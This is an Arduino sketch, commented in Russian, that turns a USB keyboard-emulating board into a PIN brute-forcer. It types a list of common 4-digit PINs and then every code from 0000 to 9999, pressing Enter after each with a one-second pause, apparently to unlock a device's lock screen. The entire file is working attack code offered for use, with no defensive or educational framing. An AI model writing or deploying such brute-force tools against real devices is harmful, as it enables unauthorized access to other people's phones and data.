#include <Keyboard.h>
#include <Arduino.h>

// Список 4-х значных паролей
const char* passwords[] = {
  "1234",
  "0000",
  "2580",
  "1111",
  "5555",
  "5683",
  "0852",
  "2222",
  "1212",
  "1998",
  "4321",
  "1111",
  "3333",
  "4444",
  "5555",
  "6666",
  "7777",
  "8888",
  "9999",
  "2019",
  "6969",
  "2000",
  "1000",
  "3000",
  "4000",
  "5000",
  "6000",
  "2121",
  "1212",
  "4545",
  "3232",
  "5454",
  "4545",
  "1100",
  "2587",
  "1230",
  "9786",
  "6789",
  "5432",
  "1357",
  "9870",
  "1235",
  "5000",
  "9990",
  "2323",
  "0001",
  "0002",
  "0005"
};

int currentPasswordIndex = 0;

void setup() {
  Keyboard.begin();
  delay(2000); // Ждем 2 секунды перед началом перебора
}

void loop() {
  // Если есть пароль в списке, используем его
  if (currentPasswordIndex < sizeof(passwords) / sizeof(passwords[0])) {
    const char* password = passwords[currentPasswordIndex];
    currentPasswordIndex++;

    // Вводим пароль на клавиатуре
    Keyboard.print(password);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(1000); // Ждем 1 секунду между попытками

    // Здесь можно добавить код для проверки успешного ввода пароля

    // Выводим текущую комбинацию в монитор порта
    Serial.println(password);
  }
  // Если список паролей закончился, перебираем от 0000 до 9999
  else {
    static int currentCode = 0;

    // Форматируем текущий код как четырехзначное число
    char code[5];
    snprintf(code, sizeof(code), "%04d", currentCode);

    // Вводим текущий код на клавиатуре
    Keyboard.print(code);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(1000); // Ждем 1 секунду между попытками

    // Здесь можно добавить код для проверки успешного ввода пароля

    // Выводим текущую комбинацию в монитор порта
    Serial.println(code);

    currentCode++;

    // Если дошли до 10000, заканчиваем работу скрипта
    if (currentCode > 9999) {
      while (true) {
        // Здесь можно добавить код для завершения работы скрипта
      }
    }
  }
}
